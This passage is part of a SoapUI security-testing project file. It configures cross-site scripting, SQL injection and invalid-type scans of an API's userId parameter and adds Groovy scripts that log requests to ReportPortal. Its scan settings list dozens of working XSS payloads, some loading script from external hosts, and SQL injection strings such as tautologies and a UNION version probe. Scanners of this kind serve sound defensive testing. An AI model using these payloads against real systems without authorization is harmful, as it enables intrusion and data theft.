def closeTestStepResults = closeTestStepRunner.getResults();
log.info("TestStep closed - " + closeTestStepResults[1].getStatus());


def manipulateLogMessage(message){
message = message.replace("\"", '\\\"');
message = message.replace("'", '\\\"');
message = message.replace("\t", '');
message = message.replace('\n','')
message = message.replace('\r','');
message = message.replace('&amp;quot;','"');
return message;
}</scriptText>
              </con:configuration>
            </con:assertion>
            <con:assertion type="Simple NotContains" id="c58ea827-4cc5-4d12-9354-1ac243ae7f72" name="customer not retreived">
              <con:configuration>
                <token>Customer successfully retrieved</token>
                <ignoreCase>false</ignoreCase>
                <useRegEx>false</useRegEx>
              </con:configuration>
            </con:assertion>
            <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
            <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:parameters label="mlp" parameterName="mlp" xpath="" checked="true"/>
              <con:parameters label="format" parameterName="format" xpath="" checked="true"/>
              <con:parameters label="userId" parameterName="id" xpath="" checked="true"/>
            </con:checkedParameters>
            <con:executionStrategy xsi:nil="true" immutable="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:strategy>ALL_AT_ONCE</con:strategy>
              <con:delay>100</con:delay>
            </con:executionStrategy>
          </con:testStepSecurityScan>
          <con:testStepSecurityScan type="CrossSiteScriptingScan" name="Cross Site Scripting" id="1332c641-9438-414b-9c79-d336d6c32aee" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
            <con:settings/>
            <con:config xsi:type="con:CrossSiteScriptingScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:parameterExposureStrings>&lt;PLAINTEXT></con:parameterExposureStrings>
              <con:parameterExposureStrings>';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//-->&lt;/SCRIPT>">'>&lt;SCRIPT>alert(String.fromCharCode(88,83,83))&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>'';!--"&lt;XSS>=&amp;{()}</con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT SRC=http://soapui.org/xss.js>&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC="javascript:alert('XSS');"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC=javascript:alert('XSS')></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC=JaVaScRiPt:alert('XSS')></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC=`javascript:alert("RSnake says, 'XSS'")`></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG """>&lt;SCRIPT>alert("XSS")&lt;/SCRIPT>"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))></con:parameterExposureStrings>
              <con:parameterExposureStrings><![CDATA[<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>]]></con:parameterExposureStrings>
              <con:parameterExposureStrings><![CDATA[<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>]]></con:parameterExposureStrings>
              <con:parameterExposureStrings><![CDATA[<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>]]></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC="jav	ascript:alert('XSS');"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x09;ascript:alert('XSS');"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x0A;ascript:alert('XSS');"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x0D;ascript:alert('XSS');"></con:parameterExposureStrings>
              <con:parameterExposureStrings>perl -e 'print "&lt;IMG SRC=java\0script:alert(\"XSS\")>";' > out</con:parameterExposureStrings>
              <con:parameterExposureStrings>perl -e 'print "&lt;SCR\0IPT>alert(\"XSS\")&lt;/SCR\0IPT>";' > out</con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC=" &amp;#14;  javascript:alert('XSS');"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT/XSS SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT/SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;&lt;SCRIPT>alert("XSS");//&lt;&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT SRC=http://soapui.org/xss.js?&lt;B></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT SRC=//ha.ckers.org/.j></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC="javascript:alert('XSS')"</con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;iframe src=http://soapui.org/scriptlet.html &lt;</con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT>a=/XSS/alert(a.source)&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>\";alert('XSS');//</con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;/TITLE>&lt;SCRIPT>alert("XSS");&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;BODY BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;BODY ONLOAD=alert('XSS')></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG DYNSRC="javascript:alert('XSS')"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG LOWSRC="javascript:alert('XSS')"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;BGSOUND SRC="javascript:alert('XSS');"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;BR SIZE="&amp;{alert('XSS')}"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;LAYER SRC="http://soapui.org/scriptlet.html">&lt;/LAYER></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;LINK REL="stylesheet" HREF="http://soapui.org/xss.css"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;STYLE>@import'http://soapui.org/xss.css';&lt;/STYLE></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;META HTTP-EQUIV="Link" Content="&lt;http://soapui.org/xss.css>; REL=stylesheet"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;STYLE>BODY{-moz-binding:url("http://soapui.org/xssmoz.xml#xss")}&lt;/STYLE></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;XSS STYLE="behavior: url(xss.htc);"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;STYLE>li {list-style-image: url("javascript:alert('XSS')");}&lt;/STYLE>&lt;UL>&lt;LI>XSS</con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC='vbscript:msgbox("XSS")'></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC="mocha:[code]"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC="livescript:[code]"></con:parameterExposureStrings>
              <con:parameterExposureStrings>�script�alert(�XSS�)�/script�</con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IFRAME SRC="javascript:alert('XSS');">&lt;/IFRAME></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;FRAMESET>&lt;FRAME SRC="javascript:alert('XSS');">&lt;/FRAMESET></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;TABLE BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;TABLE>&lt;TD BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;DIV STYLE="background-image: url(javascript:alert('XSS'))"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;DIV STYLE="background-image: url(&amp;#1;javascript:alert('XSS'))"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;DIV STYLE="width: expression(alert('XSS'));"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;STYLE>@im\port'\ja\vasc\ript:alert("XSS")';&lt;/STYLE></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;XSS STYLE="xss:expression(alert('XSS'))"></con:parameterExposureStrings>
              <con:parameterExposureStrings>exp/*&lt;A STYLE='no\xss:noxss("*//*");xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert("XSS"))'></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;STYLE TYPE="text/javascript">alert('XSS');&lt;/STYLE></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;STYLE>.XSS{background-image:url("javascript:alert('XSS')");}&lt;/STYLE>&lt;A CLASS=XSS>&lt;/A></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}&lt;/STYLE></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;!--[if gte IE 4]>&lt;SCRIPT>alert('XSS');&lt;/SCRIPT>&lt;![endif]--></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;BASE HREF="javascript:alert('XSS');//"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;OBJECT TYPE="text/x-scriptlet" DATA="http://soapui.org/scriptlet.html">&lt;/OBJECT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>&lt;param name=url value=javascript:alert('XSS')>&lt;/OBJECT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;EMBED SRC="http://soapui.org/xss.swf" AllowScriptAccess="always">&lt;/EMBED></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always">&lt;/EMBED></con:parameterExposureStrings>
              <con:parameterExposureStrings>a="get";b="URL(\"";c="javascript:";d="alert('XSS');\")";eval(a+b+c+d);</con:parameterExposureStrings>
              <con:parameterExposureStrings><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]]]>><![CDATA[<![CDATA[cript:alert('XSS');">]]]]>><![CDATA[</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>]]></con:parameterExposureStrings>
              <con:parameterExposureStrings><![CDATA[<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>]]></con:parameterExposureStrings>
              <con:parameterExposureStrings><![CDATA[<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>]]></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT SRC="http://soapui.org/xss.jpg">&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;? echo('&lt;SCR)';echo('IPT>alert("XSS")&lt;/SCRIPT>'); ?></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC="http://soapui.org/somecommand.php?somevariables=maliciouscode"></con:parameterExposureStrings>
              <con:parameterExposureStrings>Redirect 302 /a.jpg http://soapui.org/admin.asp&amp;deleteuser</con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;META HTTP-EQUIV="Set-Cookie" Content="USERID=&amp;lt;SCRIPT&amp;gt;alert('XSS')&amp;lt;/SCRIPT&amp;gt;"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;HEAD>&lt;META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> &lt;/HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-</con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT a=">" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT =">" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT a=">" '' SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT "a='>'" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT a=`>` SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT a=">'>" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT>document.write("&lt;SCRI");&lt;/SCRIPT>PT SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
            </con:config>
            <con:assertion type="CrosSiteScript" id="09b7830e-ded3-4e15-ad56-9379a62ee5f5" name="Cross Site Scripting Detection">
              <con:configuration>
                <groovyScript/>
                <checkResponse>true</checkResponse>
                <checkSeparateHTML>false</checkSeparateHTML>
              </con:configuration>
            </con:assertion>
            <con:assertion type="Sensitive Information Exposure" id="65ef6a75-6e6f-472c-9126-dc9c4620ca79" name="Sensitive Information Exposure">
              <con:configuration>
                <IncludeProjectSpecific>true</IncludeProjectSpecific>
                <IncludeGlobal>true</IncludeGlobal>
              </con:configuration>
            </con:assertion>
            <con:assertion type="GroovyScriptAssertion" id="6e9e956c-aa7c-49a7-b6d3-3eb345fd7abb" name="capture req/response data">
              <con:configuration>
                <scriptText>String response = messageExchange.getResponseContent();
String reqBody = messageExchange.getRequestContent();
String endPoint = messageExchange.getEndpoint()


HashMap&lt;String,String> properties = messageExchange.getProperties()

def parameterJson = [:]
properties.each{ key,value ->
  parameterJson[(key)] = value;
  //log.info ("Property - " + key + "::" + value);
  }
parameterString = parameterJson.toMapString()
//log.info("params -- " + parameterString);
//String changedParams = messageExchange.getProperty("SecurityChangedParameters");
def timeTaken = messageExchange.getTimeTaken();
def testStepName = context.testCase.getTestStepAt(context.getCurrentStepIndex()).getLabel();
def securityTestName = context.getCurrentScan().getParent().getName();
def scan = context.getCurrentScan().getName();

if(context.INDEX == null){
	context.INDEX = 0;
	//context.stepData = [];
}
context.INDEX = context.INDEX + 1;

KEY = securityTestName + "_" + testStepName + "_" + scan //+ "_" + System.currentTimeMillis().toString();

stepMessage = ["request": reqBody, "response": response, "timeTaken": timeTaken.toString(), "parameters": parameterString]

context.newJson &lt;&lt; [(KEY): [(context.INDEX): ["request": reqBody, "response": response, "timeTaken": timeTaken.toString(), "parameters": parameterString]]]

//context.jsonData &lt;&lt; [(KEY):["request": reqBody, "response": response, "timeTaken": timeTaken.toString(), "parameters": parameterString]];</scriptText>
              </con:configuration>
            </con:assertion>
            <con:assertion type="Simple NotContains" id="3377fcd6-c4a7-4f30-a88d-4ccc8c774b3a" name="Not Contains">
              <con:configuration>
                <token>Customer successfully retrieved</token>
                <ignoreCase>false</ignoreCase>
                <useRegEx>false</useRegEx>
              </con:configuration>
            </con:assertion>
            <con:assertion type="GroovyScriptAssertion" id="75b67130-be46-4f98-a26e-0fd666e98b1d" name="add data to reportportal" disabled="true">
              <con:configuration>
                <scriptText>String rawRequest = new String(messageExchange.getRawRequestData())
String rawResponse = new String(messageExchange.getRawResponseData())

def testStepName = context.testCase.getTestStepAt(context.getCurrentStepIndex()).getLabel();
def scan = context.getCurrentScan().getName();

HashMap&lt;String,String> properties = messageExchange.getProperties()
propertiesString = properties.inspect();

propertyMessage = "=============Properties=============";
propertyMessage = propertyMessage + propertiesString;
propertyMessage = manipulateLogMessage(propertyMessage);

requestMessage = "==============Raw Request================";
requestMessage = requestMessage + rawRequest;
requestMessage = manipulateLogMessage(requestMessage);

responseMessage = "=============Raw Response==============";
responseMessage = responseMessage + rawResponse;
responseMessage = manipulateLogMessage(responseMessage);


def reportPortalTestSuites = context.testCase.testSuite.project.testSuites['ReportPortal'];

//Start a TestStep.
def startTestStepTestCase = reportPortalTestSuites.testCases['StartTestStep']
startTestStepTestCase.setPropertyValue("stepName", scan + "for [" + testStepName + "]");
def startTestStepRunner = startTestStepTestCase.run(new com.eviware.soapui.support.types.StringToObjectMap(), false);
def stepResults = startTestStepRunner.getResults();
log.info("TestStep Created - " + stepResults[1].getStatus());


def addLogTestCase = reportPortalTestSuites.testCases['addLog']

// log a properties used in a call.
addLogTestCase.setPropertyValue("message", propertyMessage);
addLogTestCase.setPropertyValue("level", "info");

def addLogPropRunner = addLogTestCase.run(new com.eviware.soapui.support.types.StringToObjectMap(), false);
def addLogPropRunnerResults = addLogPropRunner.getResults();
log.info("Log Properties Status - " + addLogPropRunnerResults[1].getStatus());

// log a raw request.
addLogTestCase.setPropertyValue("message", requestMessage);
addLogTestCase.setPropertyValue("level", "info");

def addLogReqRunner = addLogTestCase.run(new com.eviware.soapui.support.types.StringToObjectMap(), false);
def addLogReqRunnerResults = addLogReqRunner.getResults();
log.info("Log Request Status - " + addLogReqRunnerResults[1].getStatus());

// log a raw response.
addLogTestCase.setPropertyValue("message", responseMessage);
addLogTestCase.setPropertyValue("level", "info");

def addLogResRunner = addLogTestCase.run(new com.eviware.soapui.support.types.StringToObjectMap(), false);
def addLogResRunnerResults = addLogResRunner.getResults();
log.info("Log Response Status - " + addLogResRunnerResults[1].getStatus());


//close the test step.
def closeTestStepTestCase = reportPortalTestSuites.testCases['closeTestStep']
closeTestStepTestCase.setPropertyValue("status", "passed");
def closeTestStepRunner = closeTestStepTestCase.run(new com.eviware.soapui.support.types.StringToObjectMap(), false);
def closeTestStepResults = closeTestStepRunner.getResults();
log.info("TestStep closed - " + closeTestStepResults[1].getStatus());


def manipulateLogMessage(message){
message = message.replace("\"", '\\\"');
message = message.replace("'", '\\\"');
message = message.replace("\t", '');
message = message.replace('\n','')
message = message.replace('\r','');
message = message.replace('&amp;quot;','"');
return message;
}</scriptText>
              </con:configuration>
            </con:assertion>
            <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
            <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:parameters label="userId" parameterName="id" xpath="" checked="true"/>
            </con:checkedParameters>
            <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:strategy>ONE_BY_ONE</con:strategy>
              <con:delay>100</con:delay>
            </con:executionStrategy>
          </con:testStepSecurityScan>
          <con:testStepSecurityScan type="SQLInjectionScan" name="SQL Injection" id="05283a70-2f7a-460a-a78e-52c95ae3d72b" applyForFailedStep="false" disabled="false">
            <con:settings/>
            <con:config xsi:type="con:SQLInjectionScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:sqlInjectionStrings>' or '1'='1</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>'--</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>1'</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>admin'--</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>/*!10000%201/0%20*/</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>/*!10000 1/0 */</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>1/0</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>'%20o/**/r%201/0%20--</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>' o/**/r 1/0 --</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>;</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>'%20and%201=2%20--</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>' and 1=2 --</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>test�%20UNION%20select%201,%20@@version,%201,%201;�</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>test� UNION select 1, @@version, 1, 1;�</con:sqlInjectionStrings>
            </con:config>
            <con:assertion type="Sensitive Information Exposure" id="8097a10c-1909-4c06-ae41-a51e1efd7122" name="Sensitive Information Exposure">
              <con:configuration>
                <IncludeProjectSpecific>true</IncludeProjectSpecific>
                <IncludeGlobal>true</IncludeGlobal>
              </con:configuration>
            </con:assertion>
            <con:assertion type="GroovyScriptAssertion" id="fa27de44-09f7-4443-ab94-24bc97b20f0c" name="capture request data">
              <con:configuration>
                <scriptText>String response = messageExchange.getResponseContent();
String reqBody = messageExchange.getRequestContent();
String endPoint = messageExchange.getEndpoint()


HashMap&lt;String,String> properties = messageExchange.getProperties()

def parameterJson = [:]
properties.each{ key,value ->
  parameterJson[(key)] = value;
  //log.info ("Property - " + key + "::" + value);
  }
parameterString = parameterJson.toMapString()
//log.info("params -- " + parameterString);
//String changedParams = messageExchange.getProperty("SecurityChangedParameters");
def timeTaken = messageExchange.getTimeTaken();
def testStepName = context.testCase.getTestStepAt(context.getCurrentStepIndex()).getLabel();
def securityTestName = context.getCurrentScan().getParent().getName();
def scan = context.getCurrentScan().getName();

if(context.INDEX == null){
	context.INDEX = 0;
	//context.stepData = [];
}
context.INDEX = context.INDEX + 1;

KEY = securityTestName + "_" + testStepName + "_" + scan //+ "_" + System.currentTimeMillis().toString();

stepMessage = ["request": reqBody, "response": response, "timeTaken": timeTaken.toString(), "parameters": parameterString]

context.newJson &lt;&lt; [(KEY): [(context.INDEX): ["request": reqBody, "response": response, "timeTaken": timeTaken.toString(), "parameters": parameterString]]]

//context.jsonData &lt;&lt; [(KEY):["request": reqBody, "response": response, "timeTaken": timeTaken.toString(), "parameters": parameterString]];</scriptText>
              </con:configuration>
            </con:assertion>
            <con:assertion type="Simple NotContains" id="de64bb3b-bd3d-428c-8c60-91daae76190b" name="customer not retreived">
              <con:configuration>
                <token>Customer successfully retrieved</token>
                <ignoreCase>false</ignoreCase>
                <useRegEx>false</useRegEx>
              </con:configuration>
            </con:assertion>
            <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
            <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:parameters label="userId" parameterName="id" xpath="" checked="true"/>
            </con:checkedParameters>
            <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:strategy>ONE_BY_ONE</con:strategy>
              <con:delay>100</con:delay>
            </con:executionStrategy>
          </con:testStepSecurityScan>
          <con:testStepSecurityScan type="InvalidTypesSecurityScan" name="Invalid Types" id="2d54976f-a69e-4623-bd26-d2a8bf7958c4" applyForFailedStep="false" disabled="false" runOnlyOnce="false">
            <con:settings/>
            <con:config xsi:type="con:InvalidSecurityScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:typesList>
                <con:type>3</con:type>
                <con:value>true</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>4</con:type>
                <con:value>GpM7</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>5</con:type>
                <con:value>0FB7</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>9</con:type>
                <con:value>-1E4f</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>10</con:type>
                <con:value>12.45E+12</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>11</con:type>
                <con:value>-1.23</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>12</con:type>
                <con:value>SoapUI is	 the
 best</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>13</con:type>
                <con:value>P1Y2M3DT10H30M12.3S</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>14</con:type>
                <con:value>1999-05-31T13:20:00.000-05:00</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>16</con:type>
                <con:value>1999-05-31</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>22</con:type>
                <con:value>-1267896799</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>23</con:type>
                <con:value>-882223334991111111</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>24</con:type>
                <con:value>-2147483647</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>25</con:type>
                <con:value>-32768</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>26</con:type>
                <con:value>127</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>27</con:type>
                <con:value>0</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>28</con:type>
                <con:value>-1</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>29</con:type>
                <con:value>1</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>30</con:type>
                <con:value>1267896799</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>31</con:type>
                <con:value>882223334991111111</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>32</con:type>
                <con:value>294967295</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>33</con:type>
                <con:value>65535</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>34</con:type>
                <con:value>255</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>35</con:type>
                <con:value>SoapUI is the best</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>36</con:type>
                <con:value>SoapUI is the best</con:value>
              </con:typesList>
            </con:config>
            <con:assertion type="Sensitive Information Exposure" id="f46e73ec-591b-4595-8177-16b5d8607907" name="Sensitive Information Exposure">
              <con:configuration>
                <IncludeProjectSpecific>true</IncludeProjectSpecific>
                <IncludeGlobal>true</IncludeGlobal>
              </con:configuration>
            </con:assertion>
            <con:assertion type="GroovyScriptAssertion" id="1aef62a0-c844-4fea-a389-448fc1b71eed" name="capture request data">
              <con:configuration>
                <scriptText>String response = messageExchange.getResponseContent();
String reqBody = messageExchange.getRequestContent();
String endPoint = messageExchange.getEndpoint()


HashMap&lt;String,String> properties = messageExchange.getProperties()

def parameterJson = [:]
properties.each{ key,value ->
  parameterJson[(key)] = value;
  //log.info ("Property - " + key + "::" + value);
  }
parameterString = parameterJson.toMapString()
//log.info("params -- " + parameterString);
//String changedParams = messageExchange.getProperty("SecurityChangedParameters");
def timeTaken = messageExchange.getTimeTaken();
def testStepName = context.testCase.getTestStepAt(context.getCurrentStepIndex()).getLabel();
def securityTestName = context.getCurrentScan().getParent().getName();
def scan = context.getCurrentScan().getName();

if(context.INDEX == null){
	context.INDEX = 0;
	//context.stepData = [];
}
context.INDEX = context.INDEX + 1;

KEY = securityTestName + "_" + testStepName + "_" + scan //+ "_" + System.currentTimeMillis().toString();

stepMessage = ["request": reqBody, "response": response, "timeTaken": timeTaken.toString(), "parameters": parameterString]

context.newJson &lt;&lt; [(KEY): [(context.INDEX): ["request": reqBody, "response": response, "timeTaken": timeTaken.toString(), "parameters": parameterString]]]

//context.jsonData &lt;&lt; [(KEY):["request": reqBody, "response": response, "timeTaken": timeTaken.toString(), "parameters": parameterString]];</scriptText>
              </con:configuration>
            </con:assertion>
            <con:assertion type="Simple NotContains" id="d6657a42-c920-491a-bac2-9b5c0945f619" name="Customer not retreived">
              <con:configuration>
